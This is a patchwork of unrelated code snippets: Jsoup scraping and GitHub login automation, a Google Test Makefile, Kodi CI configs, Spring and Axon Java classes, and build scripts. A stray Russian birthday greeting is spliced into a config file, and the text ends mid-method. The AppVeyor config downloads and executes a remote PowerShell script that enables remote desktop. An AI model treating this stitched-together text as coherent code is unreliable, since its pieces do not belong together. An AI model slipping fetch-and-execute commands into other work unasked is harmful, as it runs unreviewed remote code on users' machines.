input[type=\"hidden\"]:nth-child(2)")                            .first()                            .attr("value"); HashMap<String, String> formData = new HashMap<>(); formData.put("commit", "Sign in"); formData.put("utf8", "e2 9c 93"); formData.put("login", USERNAME); formData.put("password", PASSWORD); formData.put("authenticity_token", authToken); // # Now send the form for login Connection.Response homePage = Jsoup.connect(LOGIN_ACTION_URL)      .cookies(cookies)      .data(formData)      .method(Connection.Method.POST)      .userAgent(USER_AGENT)      .execute(); System.out.println(homePage.parse().html()); 

// # Constants used in this example final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"; final String LOGIN_FORM_URL = "https://github.com/login"; final String USERNAME = "yourUsername"; final String PASSWORD = "yourPassword"; // # Go to login page Connection.Response loginFormResponse = Jsoup.connect(LOGIN_FORM_URL)                                              .method(Connection.Method.GET)                                              .userAgent(USER_AGENT)                                              .execute(); // # Fill the login form // ## Find the form first... FormElement loginForm = (FormElement)loginFormResponse.parse()                                          .select("div#login > form").first(); checkElement("Login Form", loginForm); // ## ... then "type" the username ... Element loginField = loginForm.select("#login_field").first(); checkElement("Login Field", loginField); loginField.val(USERNAME); // ## ... and "type" the password Element passwordField = loginForm.select("#password").first(); checkElement("Password Field", passwordField); passwordField.val(PASSWORD); // # Now send the form for login Connection.Response loginActionResponse = loginForm.submit()          .cookies(loginFormResponse.cookies())          .userAgent(USER_AGENT)
.execute(); System.out.println(loginActionResponse.parse().html()); public static void checkElement(String name, Element elem) {     if (elem == null) {         throw new RuntimeException("Unable to find " + name);     } }

// load source from file     Document doc = Jsoup.parse(new File("page.html"), "UTF-8");     // iterate over row and col     for (Element row : doc.select("table#data > tbody > tr"))         for (Element col : row.select("td"))             // print results             System.out.println(col.ownText());

// load page using HTML Unit and fire scripts     WebClient webClient = new WebClient();     HtmlPage myPage = webClient.getPage(new File("page.html").toURI().toURL());     // convert page to generated HTML and convert to document     doc = Jsoup.parse(myPage.asXml());     // iterate row and col     for (Element row : doc.select("table#data > tbody > tr"))         for (Element col : row.select("td"))             // print results             System.out.println(col.ownText());     // clean up resources     webClient.close();

String html = "<!DOCTYPE html>" +               "<html>" +                 "<head>" +                   "<title>Hello world!</title>" +                 "</head>" +                 "<body>" +                   "<h1>Hello there!</h1>" +                   "<p>First paragraph</p>" +                   "<p class=\"not-first\">Second paragraph</p>" +                   "<p class=\"not-first third\">Third <a href=\"page.html\">paragraph</a></p>" +                 "</body>" +               "</html>";

// Parse the document Document doc = Jsoup.parse(html); // Get document title String title = doc.select("head > title").first().text(); System.out.println(title); // Hello world! Element firstParagraph = doc.select("p").first(); // Get all paragraphs except from the first Elements otherParagraphs = doc.select("p.not-first"); // Same as otherParagraphs = doc.select("p"); otherParagraphs.remove(0); // Get the third paragraph (second in the list otherParagraphs which // excludes the first paragraph) Element thirdParagraph = otherParagraphs.get(1); // Alternative: thirdParagraph = doc.select("p.third"); // You can also select within elements, e.g. anchors with a href attribute // within the third paragraph. Element link = thirdParagraph.select("a[href]"); // or the first <h1> element in the document body Element headline = doc.select("body").first().select("h1").first();
--------------------------------------------------------------------------------------------------------
# A Makefile for fusing Google Test and building a sample test against it.
#
# SYNOPSIS:
#
#   make [all]  - makes everything.
#   make TARGET - makes the given target.
#   make check  - makes everything and runs the built sample test.
#   make clean  - removes all files generated by make.

# Points to the root of fused Google Test, relative to where this file is.
FUSED_GTEST_DIR = output

# Paths to the fused gtest files.
FUSED_GTEST_H = $(FUSED_GTEST_DIR)/gtest/gtest.h
FUSED_GTEST_ALL_CC = $(FUSED_GTEST_DIR)/gtest/gtest-all.cc

# Where to find the sample test.
SAMPLE_DIR = ../../samples

# Where to find gtest_main.cc.
GTEST_MAIN_CC = ../../src/gtest_main.cc

# Flags passed to the preprocessor.
# We have no idea here whether pthreads is available in the system, so
# disable its use.
CPPFLAGS += -I$(FUSED_GTEST_DIR) -DGTEST_HAS_PTHREAD=0

# Flags passed to the C++ compiler.
CXXFLAGS += -g

all : sample1_unittest

check : all
	./sample1_unittest

clean :
	rm -rf $(FUSED_GTEST_DIR) sample1_unittest *.o

$(FUSED_GTEST_H) :
	../fuse_gtest_files.py $(FUSED_GTEST_DIR)

$(FUSED_GTEST_ALL_CC) :
	../fuse_gtest_files.py $(FUSED_GTEST_DIR)

gtest-all.o : $(FUSED_GTEST_H) $(FUSED_GTEST_ALL_CC)
	$(CXX) $(CPPFLAGS) $(CXXFLAGS) -c $(FUSED_GTEST_DIR)/gtest/gtest-all.cc

gtest_main.o : $(FUSED_GTEST_H) $(GTEST_MAIN_CC)
	$(CXX) $(CPPFLAGS) $(CXXFLAGS) -c $(GTEST_MAIN_CC)

sample1.o : $(SAMPLE_DIR)/sample1.cc $(SAMPLE_DIR)/sample1.h
	$(CXX) $(CPPFLAGS) $(CXXFLAGS) -c $(SAMPLE_DIR)/sample1.cc

sample1_unittest.o : $(SAMPLE_DIR)/sample1_unittest.cc \
                     $(SAMPLE_DIR)/sample1.h $(FUSED_GTEST_H)
	$(CXX) $(CPPFLAGS) $(CXXFLAGS) -c $(SAMPLE_DIR)/sample1_unittest.cc

sample1_unittest : sample1.o sample1_unittest.o gtest-all.o gtest_main.o
	$(CXX) $(CPPFLAGS) $(CXXFLAGS) $^ -o $@
--------------------------------------------------------------------------------------------------------
os: Visual Studio 2015

shallow_clone: true

environment:
  CONFIG: Release
  matrix:
    - BUILD: Kodi
    # - ADDONS: audiodecoder
    # - ADDONS: audioencoder
    # - ADDONS: pvr
    # - ADDONS: screensaver
    # - ADDONS: visualization

init:
  - ps: iex ((new-object net.webclient).DownloadString('https://raw.githubusercontent.com/appveyor/ci/master/scripts/enable-rdp.ps1'))

install:
  - SET PATH=C:\Program Files (x86)\CMake\bin;C:\msys64\bin;C:\msys64\usr\bin;%PATH%
  - bash -lc "pacman --needed --noconfirm -Sy"
  - mklink /j %APPVEYOR_BUILD_FOLDER%\project\BuildDependencies\msys64 C:\msys64

build_script:
  # Setup Visual Studio compiler environment
  - ps: $ErrorActionPreference= 'silentlycontinue'

  # Setup Visual Studio compiler environment
  - call "%VS140COMNTOOLS%..\..\VC\bin\vcvars32.bat"

  #
  # Build Kodi
  #
  - ps: |
      if ($env:BUILD -eq "Kodi") {
        # Download dependencies
        cd $env:APPVEYOR_BUILD_FOLDER\tools\buildsteps\windows\win32
        & .\download-dependencies.bat
        # We are using AppVeyor's already installed msys64 environment,
        # no need to install msys/mingw environment.
        # Download precompiled mingw32 libraries
        # To run make-mingwlibs.bat on AppVeyor takes too long,
        # we must use precompiled libs to speed up build
        bash -c "wget -O - http://repo.msys2.org/mingw/i686/mingw-w64-i686-ffmpeg-3.3-1-any.pkg.tar.xz | tar xJv"
        bash -c "wget -O - http://repo.msys2.org/mingw/i686/mingw-w64-i686-libdvdcss-1.4.0-1-any.pkg.tar.xz | tar xJv"
        bash -c "wget -O - http://repo.msys2.org/mingw/i686/mingw-w64-i686-libdvdnav-5.0.3-1-any.pkg.tar.xz | tar xJv"
        bash -c "wget -O - http://repo.msys2.org/mingw/i686/mingw-w64-i686-libdvdread-5.0.3-1-any.pkg.tar.xz | tar xJv"
        # Rename all precompiled lib*.dll.a -> *.lib, so MSVC will find them
        Get-ChildItem mingw32\lib\lib*.dll.a | %{
          $new_name = $_.Name.SubString(3) -replace ".dll.a", ".lib"
          $new_fullname = Join-Path $_.DirectoryName $new_name
          Rename-Item $_.FullName $new_fullname
        }
        # Copy all libs and includes under Kodi's dependencies folder
        xcopy /s /y mingw32\*.* .
        xcopy /s /y mingw32\bin\*.dll $env:APPVEYOR_BUILD_FOLDER\system\
        # Build
        mkdir $env:APPVEYOR_BUILD_FOLDER\kodi-build
        cd $env:APPVEYOR_BUILD_FOLDER\kodi-build
        cmd /c 'cmake -G "Visual Studio 14" .. 2>&1'
        cmd /c 'cmake --build . --target all_build --config RelWithDebInfo 2>&1'
      }
  #
  # Build Addons
  #
  - ps: |
      if ($env:ADDONS.length -ne 0 -and $env:BUILD -ne "Kodi") {
        # Bootstrap
        cd $env:APPVEYOR_BUILD_FOLDER\tools\buildsteps\windows\win32
        & .\bootstrap-addons.bat
        # Create build folder
        md -Force $env:APPVEYOR_BUILD_FOLDER\build | out-null
        cd $env:APPVEYOR_BUILD_FOLDER\build
        # Configure
        cmake -DADDONS_TO_BUILD="$env:ADDONS".* `
              -G "NMake Makefiles" `
              -DCMAKE_BUILD_TYPE="$env:CONFIG" `
              -DCMAKE_INSTALL_PREFIX="$env:APPVEYOR_BUILD_FOLDER"\addons `
              $env:APPVEYOR_BUILD_FOLDER\cmake\addons
        # Build selected addons one by one
        $addons_success=""
        $addons_failed=""
        nmake supported_addons | %{
          if ($_ -like "ALL_ADDONS_BUILDING: *") {
            $_.SubString(21).Split(" ") | %{
              Write-Host "Building " $_
              nmake $_
              if ($LASTEXITCODE -eq 0) {
                $addons_success += $_ + " "
              } else {
                $addons_failed += $_  + " "
              }
            }
          }
        }
        # Print succesful and failed addons
        Write-Host "--------------------------------------------------"
        if ($addons_success -ne "") {
          $addons_success.Split(" ") | %{
            if ($_ -ne "") {
              Write-Host [SUCCESS] $_ -ForegroundColor Green
            }
          }
        }
        if ($addons_failed -ne "") {
          $addons_failed.Split(" ") | %{
            if ($_ -ne "") {
              Write-Host [ ERROR ] $_ -ForegroundColor Red
            }
          }
          exit 1
        }
      }
test: off
--------------------------------------------------------------------------------------------------------
# Kodi's travis-ci.org integration file

# TODO:
# integrate with slack
# make it perfect... or not ;-r


language: cpp

# Define the build matrix
#
# Travis defaults to building on Ubuntu Precise when building on Linux. We need Trusty in order to get up
# to date versions of cmake and g++.
#
os: linux
dist: xenial
sudo: required
compiler:
  - gcc
  - clang

env:
  - BUILD=Kodi TOOLS=CMake
#  - ADDONS=audiodecoder
#  - ADDONS=audioencoder
#  - ADDONS=pvr
#  - ADDONS=screensaver
#  - ADDONS=visualization

matrix:
  fast_finish: true
  allow_failures:
#    - env: ADDONS=audiodecoder
#    - env: ADDONS=audioencoder
#    - env: ADDONS=pvr
#    - env: ADDONS=screensaver
#    - env: ADDONS=visualization

# Prepare system
#
# Prepare the system to install prerequisites or dependencies
#
before_install:
# Prune non-root Python from PATH. Solves https://github.com/travis-ci/travis-ci/issues/4948
# see: https://github.com/travis-ci/travis-ci/issues/5326
  - export PATH=$(echo $PATH | tr ':' "\n" | sed '/\/opt\/python/d' | tr "\n" ":" | sed "s|::|:|g")

# Linux
#
# Install team-xbmc/xbmc-ppa-build-depends for some dependencies and ppa:wsnipex/vaapi for libda-dev 1.6.0.
# Stupid libda-dev 1.3.0 does not work on Trusty.

  - if [[ "$TRAVIS_OS_NAME" == "linux" && "$BUILD" == "Kodi" ]]; then
      sudo add-apt-repository -y ppa:team-xbmc/xbmc-ppa-build-depends &&
      sudo add-apt-repository -y ppa:wsnipex/vaapi &&
      sudo add-apt-repository -y ppa:pulse-eight/libcec &&
      sudo apt-get update -qq;
    fi

# Install dependencies
#
# Install any prerequisites or dependencies necessary to run our builds
#
install:

# Linux dependencies
#
  - if [[ "$TRAVIS_OS_NAME" == "linux" && "$BUILD" == "Kodi" ]]; then
      sudo apt-get install -qq automake autopoint build-essential cmake curl default-jre gawk gdb gdc
      gettext git-core gperf libasound2-dev libass-dev libbluray-dev libbz2-dev libcap-dev libcdio-dev libcec4-dev libcrossguid-dev libcurl3
      libcurl4-openssl-dev libdbus-1-dev libegl1-mesa-dev libfmt3-dev libfontconfig-dev libfreetype6-dev libfribidi-dev libfstrcmp-dev libgif-dev libgl1-mesa-dev
      libglu1-mesa-dev libiso9660-dev libjpeg-dev liblcms2-dev libltdl-dev liblzo2-dev libmicrohttpd-dev libmysqlclient-dev libnfs-dev
      libpcre3-dev libplist-dev libpng-dev libpulse-dev libsmbclient-dev libsqlite3-dev
      libssl-dev libtag1-dev libtinyxml-dev libtool libudev-dev libusb-dev libva-dev libvdpau-dev
      libxml2-dev libxmu-dev libxrandr-dev libxrender-dev libxslt1-dev libxt-dev mesa-utils
      nasm pmount python-dev python-imaging python-sqlite rapidjson-dev swig unzip uuid-dev yasm zip zlib1g-dev;
    fi

# Prepare builds
#
before_script:

# Linux
#
  - if [[ "$TRAVIS_OS_NAME" == "linux" && "$BUILD" == "Kodi" ]]; then
      ulimit -c unlimited -S;
      mkdir $TRAVIS_BUILD_DIR/build &&
      cd $TRAVIS_BUILD_DIR/build;
    fi
  - if [[ "$TRAVIS_OS_NAME" == "linux" && "$BUILD" == "Kodi" && "$CXX" == "g++" ]]; then
      cmake -DCMAKE_BUILD_TYPE=Debug ..;
    fi
  - if [[ "$TRAVIS_OS_NAME" == "linux" && "$BUILD" == "Kodi" && "$CXX" == "clang++" ]]; then
      cmake -DCMAKE_CXX_FLAGS="-Qunused-arguments" ..;
    fi
  - if [[ "$BUILD" != "Kodi" ]] && [[ "$ADDONS" == "audiodecoder" || "$ADDONS" == "audioencoder" ||
          "$ADDONS" == "pvr" || "$ADDONS" == "screensaver" || "$ADDONS" == "visualization" ]]; then
      cd $TRAVIS_BUILD_DIR/cmake/addons &&
      mkdir -p build &&
      cd build/ &&
      cmake ../bootstrap -DCMAKE_BUILD_TYPE=Debug &&
      make -j4;
    fi

# Actually build
#
script:
  - if [[ "$BUILD" == "Kodi" ]]; then
      make -j4 &&
      make check;
    fi
  - if [[ "$BUILD" != "Kodi" ]] && [[ "$ADDONS" == "audiodecoder" || "$ADDONS" == "audioencoder" ||
          "$ADDONS" == "pvr" || "$ADDONS" == "screensaver" || "$ADDONS" == "visualization" ]]; then
      cd $TRAVIS_BUILD_DIR/ &&
      mkdir -p build &&
      cmake -DADDONS_TO_BUILD="$ADDONS".* -DCMAKE_BUILD_TYPE=Debug -DCMAKE_INSTALL_PREFIX=../addons $TRAVIS_BUILD_DIR/cmake/addons &&
      make -j4;
    fi

after_failure:
  - COREFILE=$(find . -maxdepth 1 -name "core*" | head -n 1)
  - if [[ -f "$COREFILE" ]]; then
      gdb -c "$COREFILE" kodi-test -ex "thread apply all bt" -ex "set pagination 0" -batch;
    fi

# Disable annoying emails

notifications:
  email: false
--------------------------------------------------------------------------------------------------------
Install-Package Dapper -Version 1.42.0
--------------------------------------------------------------------------------------------------------
import java.io.File;
import java.io.IOException;
import nu.xom.Builder;
import nu.xom.Document;
import nu.xom.Element;
import nu.xom.Elements;
import nu.xom.ParsingException;

public class XMLReader {
    
    public static void main(String[] args) throws ParsingException, IOException{
        File file = new File("insert path here");
        // builder builds xml data
        Builder builder = new Builder();
        Document doc = builder.build(file);
        
        // get the root element <example>
        Element root = doc.getRootElement();
        
        // gets all element with tag <person>
        Elements people = root.getChildElements("person");
        
        for (int q = 0; q < people.size(); q++){
            // get the current person element
            Element person = people.get(q);
            
            // get the name element and its children: first and last
            Element nameElement = person.getFirstChildElement("name");
            Element firstNameElement = nameElement.getFirstChildElement("first");
            Element lastNameElement = nameElement.getFirstChildElement("last");
            
            // get the age element
            Element ageElement = person.getFirstChildElement("age");
            
            // get the favorite color element
            Element favColorElement = person.getFirstChildElement("fav_color");
            
            String fName, lName, ageUnit, favColor;
            int age;
            
            try {
                fName = firstNameElement.getValue();
                lName = lastNameElement.getValue();
                age = Integer.parseInt(ageElement.getValue());
                ageUnit = ageElement.getAttributeValue("unit");
                favColor = favColorElement.getValue();
                
                System.out.println("Name: " + lName + ", " + fName);
                System.out.println("Age: " + age + " (" + ageUnit + ")");
                System.out.println("Favorite Color: " + favColor);
                System.out.println("----------------");
                
            } catch (NullPointerException ex){
                ex.printStackTrace();
            } catch (NumberFormatException ex){
                ex.printStackTrace();
            }
        }
    }   
}
--------------------------------------------------------------------------------------------------------
import com.haulmont.chile.core.annotations.MetaClass;
import com.haulmont.cuba.core.entity.annotation.UnavailableInSecurityConstraints;
import com.haulmont.cuba.core.global.UuidProvider;

import javax.persistence.Column;
import javax.persistence.Id;
import javax.persistence.MappedSuperclass;
import java.util.UUID;

/**
 * Base class for entities with UUID identifier.
 * <p>
 * Inherit from it if you need an entity without optimistic locking, create, update and soft deletion info.
 */
@MappedSuperclass
@MetaClass(name = "sys$BaseUuidEntity")
@UnavailableInSecurityConstraints
public abstract class BaseUuidEntity extends BaseGenericIdEntity<UUID> implements HasUuid {

    private static final long serialVersionUID = -2217624132287086972L;

    @Id
    @Column(name = "ID")
    protected UUID id;

    public BaseUuidEntity() {
        id = UuidProvider.createUuid();
    }

    @Override
    public UUID getId() {
        return id;
    }

    @Override
    public void setId(UUID id) {
        this.id = id;
    }

    @Override
    public UUID getUuid() {
        return id;
    }

    public void setUuid(UUID uuid) {
        this.id = uuid;
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.context.ApplicationEvent;

import javax.annotation.Nullable;

public class HealthCheckEvent extends ApplicationEvent {

    protected String response;

    /**
     * Create a new ApplicationEvent.
     *
     * @param source the object on which the event initially occurred (never {@code null})
     */
    public HealthCheckEvent(Object source) {
        super(source);
    }

    @Nullable
    public String getResponse() {
        return response;
    }

    public void setResponse(String response) {
        this.response = response;
    }
}
--------------------------------------------------------------------------------------------------------
// create HTML with JavaScript data     StringBuilder html = new StringBuilder(); 
html.append("<!DOCTYPE html> <html> <head> <title>Hello Jsoup!</title>");     html.append("<script>");     html.append("StackExchange.docs.comments.init({");     html.append("highlightColor: '#F4A83D',");     html.append("backgroundColor:'#FFF',");     html.append("});");     html.append("</script>");     html.append("<script>");     html.append("document.write(<style type='text/css'>div,iframe { top: 0; position:absolute; }</style>');");     html.append("</script>\n");     html.append("</head><body></body> </html>");     // parse as HTML document     Document doc = Jsoup.parse(html.toString());     String defaultBackground = "backgroundColor:'#FFF'";     // get <script>     for (Element scripts : doc.getElementsByTag("script")) {         // get data from <script>         for (DataNode dataNode : scripts.dataNodes()) {             // find data which contains backgroundColor:'#FFF'             if (dataNode.getWholeData().contains(defaultBackground)) {                 // replace '#FFF' -> '#ddd'                 String newData = dataNode.getWholeData().replaceAll(defaultBackground, "backgroundColor:'#ddd'");                 // set new data contents                 dataNode.setWholeData(newData);             }         }     }     System.out.println(doc.toString());
--------------------------------------------------------------------------------------------------------4
import com.haulmont.cuba.core.global.TimeSource;

import javax.validation.ClockProvider;
import java.time.Clock;
import java.time.ZonedDateTime;

public class CubaValidationTimeProvider implements ClockProvider {

    protected TimeSource timeSource;

    public CubaValidationTimeProvider(TimeSource timeSource) {
        this.timeSource = timeSource;
    }

    @Override
    public Clock getClock() {
        ZonedDateTime now = timeSource.now();
        return Clock.fixed(now.toInstant(), now.getZone());
    }
}
--------------------------------------------------------------------------------------------------------

    @Override
    public String toString() {
        return MoreObjects.toStringHelper(this)
                .add("entityName", entityName)
                .add("variableName", variableName)
                .toString();
    }
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.databind.ObjectMapper;
import org.axonframework.springboot.SerializerProperties;
import org.springframework.boot.autoconfigure.AutoConfigureAfter;
import org.springframework.boot.autoconfigure.AutoConfigureBefore;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.autoconfigure.condition.ConditionalOnExpression;
import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
@AutoConfigureBefore(AxonAutoConfiguration.class)
@AutoConfigureAfter(name = "org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration")
@ConditionalOnClass(name = "com.fasterxml.jackson.databind.ObjectMapper")
@EnableConfigurationProperties(value = SerializerProperties.class)
public class ObjectMapperAutoConfiguration {

    @Bean("defaultAxonObjectMapper")
    @ConditionalOnMissingBean
    @ConditionalOnExpression("'${axon.serializer.general}' == 'jackson' || '${axon.serializer.events}' == 'jackson' || '${axon.serializer.messages}' == 'jackson'")
    public ObjectMapper defaultAxonObjectMapper() {
        return new ObjectMapper().findAndRegisterModules();
    }
}
--------------------------------------------------------------------------------------------------------
import org.axonframework.samples.trader.infra.config.CQRSInfrastructureConfig;
import org.axonframework.samples.trader.infra.config.PersistenceInfrastructureConfig;
import org.axonframework.samples.trader.listener.config.ExternalListenersConfig;
import org.axonframework.samples.trader.orders.config.OrderConfig;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Import;
import org.springframework.context.annotation.ImportResource;

@Configuration
@Import({
        CQRSInfrastructureConfig.class,
        PersistenceInfrastructureConfig.class,
        OrderConfig.class,
        ExternalListenersConfig.class
})
@ImportResource("classpath:META-INF/spring/security-context.xml")
public class AppConfig {

}

public enum TransactionState {
    STARTED, CONFIRMED, CANCELLED, EXECUTED, PARTIALLY_EXECUTED
}


import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;
import org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseFactoryBean;
import org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseType;

@Configuration
public class PersistenceInfrastructureConfig {

    @Bean
    @Profile("hsqldb")
    public EmbeddedDatabaseFactoryBean dataSource() {
        EmbeddedDatabaseFactoryBean embeddedDatabaseFactoryBean = new EmbeddedDatabaseFactoryBean();
        embeddedDatabaseFactoryBean.setDatabaseType(EmbeddedDatabaseType.HSQL);

        return embeddedDatabaseFactoryBean;
    }
}

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.socket.config.annotation.EnableWebSocket;
import org.springframework.web.socket.config.annotation.WebSocketConfigurer;
import org.springframework.web.socket.config.annotation.WebSocketHandlerRegistry;

@Configuration
@EnableWebSocket
public class WebSocketConfig implements WebSocketConfigurer {

    @Autowired
    private ExecutedTradesBroadcaster executedTradesBroadcaster;

    @Override
    public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
        registry.addHandler(executedTradesBroadcaster, "/eventbus")
                .withSockJS();
    }
}
--------------------------------------------------------------------------------------------------------
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.socket.CloseStatus;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;
import org.springframework.web.socket.handler.ConcurrentWebSocketSessionDecorator;
import org.springframework.web.socket.handler.TextWebSocketHandler;

import java.io.IOException;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;

class BroadcastingTextWebSocketHandler extends TextWebSocketHandler {

    private static final Logger logger = LoggerFactory.getLogger(BroadcastingTextWebSocketHandler.class);
    private Map<String, WebSocketSession> sessions = new ConcurrentHashMap<>();

    @Override
    public void afterConnectionEstablished(WebSocketSession session) throws Exception {
        super.afterConnectionEstablished(session);

        sessions.put(session.getId(),
                     new ConcurrentWebSocketSessionDecorator(session, (int) TimeUnit.SECONDS.toMillis(10), 5 * 1024));
    }

    @Override
    public void afterConnectionClosed(WebSocketSession session, CloseStatus status) throws Exception {
        super.afterConnectionClosed(session, status);

        sessions.remove(session.getId());
    }

    protected void broadcast(String data) {
        final TextMessage message = new TextMessage(data);
        sessions.forEach((key, session) -> {
            try {
                session.sendMessage(message);
            } catch (IOException e) {
                logger.warn("An error occurred while trying to send a message to a WebSocket", e);
            }
        });
    }
}
--------------------------------------------------------------------------------------------------------
Присоединяюсь к поздравлениям коллег. Ольга, поздравляю с Днем Рождения! Желаю исполнения желаний и удачи в достижении поставленных целей!

org.springframework.boot.autoconfigure.EnableAutoConfiguration=\
  org.axonframework.extensions.springcloud.autoconfig.RoutingStrategyAutoConfiguration,\
  org.axonframework.extensions.springcloud.autoconfig.SpringCloudAutoConfiguration
--------------------------------------------------------------------------------------------------------
@Bean(initMethod = "start", destroyMethod = "shutDown")
--------------------------------------------------------------------------------------------------------
#!/bin/sh
export IDEA="/C/Program Files (x86)/JetBrains/IntelliJ IDEA 14.1"
if [ ! -e "$IDEA" ]
then
    export IDEA="/Applications/IntelliJ IDEA 14.app/Contents"
fi
if [ ! -e "$IDEA" ]
then
    export IDEA="/Applications/IntelliJ IDEA CE.app/Contents"
fi
if [ ! -e "$IDEA" ]
then
    echo "IDEA libraries not found!"
    echo "Checked: /C/Program Files (x86)/JetBrains/IntelliJ IDEA 14.1"
    echo "Checked: /Applications/IntelliJ IDEA 14.app/Contents"
    echo "Checked: /Applications/IntelliJ IDEA CE.app/Contents"
    echo ""
    echo "Try installing the IDEA Community Edition"
    exit 1
fi

export IDEA_VERSION=LOCAL
mvn install:install-file -Dfile="$IDEA/lib/annotations.jar" -DgroupId=com.intellij.idea -DartifactId=annotations -Dversion=$IDEA_VERSION -Dpackaging=jar
mvn install:install-file -Dfile="$IDEA/lib/idea.jar" -DgroupId=com.intellij.idea -DartifactId=idea -Dpackaging=jar -DgeneratePom=true -DcreateChecksum=true -Dversion=$IDEA_VERSION
mvn install:install-file -Dfile="$IDEA/lib/openapi.jar" -DgroupId=com.intellij.idea -DartifactId=openapi -Dpackaging=jar -DgeneratePom=true -DcreateChecksum=true -Dversion=$IDEA_VERSION
mvn install:install-file -Dfile="$IDEA/lib/util.jar" -DgroupId=com.intellij.idea -DartifactId=util -Dpackaging=jar -DgeneratePom=true -DcreateChecksum=true -Dversion=$IDEA_VERSION
mvn install:install-file -Dfile="$IDEA/lib/extensions.jar" -DgroupId=com.intellij.idea -DartifactId=extensions -Dpackaging=jar -DgeneratePom=true -DcreateChecksum=true -Dversion=$IDEA_VERSION

git update-index --assume-unchanged META-INF/plugin.xml
--------------------------------------------------------------------------------------------------------
import org.springframework.cloud.client.discovery.EnableDiscoveryClient;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;

@Profile("distributed")
@EnableDiscoveryClient
@Configuration
public class DistributedConfiguration {

}
--------------------------------------------------------------------------------------------------------
import org.apache.commons.lang3.ArrayUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.env.Environment;
import org.springframework.messaging.simp.config.MessageBrokerRegistry;
import org.springframework.web.socket.config.annotation.AbstractWebSocketMessageBrokerConfigurer;
import org.springframework.web.socket.config.annotation.EnableWebSocketMessageBroker;
import org.springframework.web.socket.config.annotation.StompEndpointRegistry;

@Configuration
@EnableWebSocketMessageBroker
public class WebSocketConfig extends AbstractWebSocketMessageBrokerConfigurer {

    @Autowired
    private Environment environment;

    @Override
    public void configureMessageBroker(MessageBrokerRegistry config) {
        if (ArrayUtils.contains(environment.getActiveProfiles(), "distributed-command-bus")) {
            config.enableStompBrokerRelay("/topic")
                  .setRelayHost("rabbitmq");
        } else {
            config.enableSimpleBroker("/topic");
        }
        config.setApplicationDestinationPrefixes("/app");
    }

    @Override
    public void registerStompEndpoints(StompEndpointRegistry registry) {
        registry.addEndpoint("/websocket")
                .withSockJS();
    }
}
--------------------------------------------------------------------------------------------------------
import com.mongodb.DBObject;
import com.mongodb.util.JSON;
import org.axonframework.serialization.ContentTypeConverter;

/**
 * ContentTypeConverter implementation that converts a DBObject structure into a String containing its Binary JSON
 * representation.
 *
 * @author Allard Buijze
 * @since 2.0
 */
public class DBObjectToStringContentTypeConverter implements ContentTypeConverter<DBObject,String> {

    @Override
    public Class<DBObject> expectedSourceType() {
        return DBObject.class;
    }

    @Override
    public Class<String> targetType() {
        return String.class;
    }

    @Override
    public String convert(DBObject original) {
        return JSON.serialize(original);
    }
}
--------------------------------------------------------------------------------------------------------
/**
 * Auto configuration for {@link RoutingStrategy}.
 *
 * @author Milan Savic
 * @since 3.1.1
 */
@Configuration
@AutoConfigureBefore(SpringCloudAutoConfiguration.class)
@ConditionalOnExpression("${axon.distributed.enabled:false}")
public class RoutingStrategyAutoConfiguration {

    @Bean
    @ConditionalOnMissingBean
    public RoutingStrategy routingStrategy() {
        return new AnnotationRoutingStrategy(UnresolvedRoutingKeyPolicy.RANDOM_KEY);
    }
}
--------------------------------------------------------------------------------------------------------
        <dependency>
            <groupId>org.jetbrains.kotlin</groupId>
            <artifactId>kotlin-stdlib-jdk8</artifactId>
            <version>${kotlin.version}</version>
        </dependency>
        <dependency>
            <groupId>org.jetbrains.kotlin</groupId>
            <artifactId>kotlin-test</artifactId>
            <version>${kotlin.version}</version>
            <scope>test</scope>
        </dependency>
		
            <plugin>
                <groupId>org.jetbrains.kotlin</groupId>
                <artifactId>kotlin-maven-plugin</artifactId>
                <version>${kotlin.version}</version>
                <executions>
                    <execution>
                        <id>compile</id>
                        <phase>compile</phase>
                        <goals>
                            <goal>compile</goal>
                        </goals>
                    </execution>
                    <execution>
                        <id>test-compile</id>
                        <phase>test-compile</phase>
                        <goals>
                            <goal>test-compile</goal>
                        </goals>
                    </execution>
                </executions>
                <configuration>
                    <jvmTarget>1.8</jvmTarget>
                </configuration>
            </plugin>
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.annotation.JsonTypeInfo;

import java.io.Serializable;

/**
 * Token that identifies a single scheduled Event. This token can be used to refer to a specific scheduled event to
 * cancel that timer.
 *
 * @author Allard Buijze
 * @since 0.7
 */
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.PROPERTY, property = "@class")
public interface ScheduleToken extends Serializable {

}
--------------------------------------------------------------------------------------------------------
#/bin/bash
echo "Build containers"
cd docker
docker-compose down -v
docker-compose -f "docker-compose.yml" build

#/bin/bash
echo "Shutdown Container"
cd docker
docker-compose down -v
--------------------------------------------------------------------------------------------------------
import java.io.File;

import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.startup.Tomcat;
import org.apache.catalina.webresources.DirResourceSet;
import org.apache.catalina.webresources.StandardRoot;

public class Main {
	public static void main(String[] args) throws Exception {
		String webappDirLocation = "src/main/webapp";
		Tomcat tomcat = new Tomcat();
		String webPort = System.getenv("PORT");
		if (webPort == null || webPort.isEmpty()) {
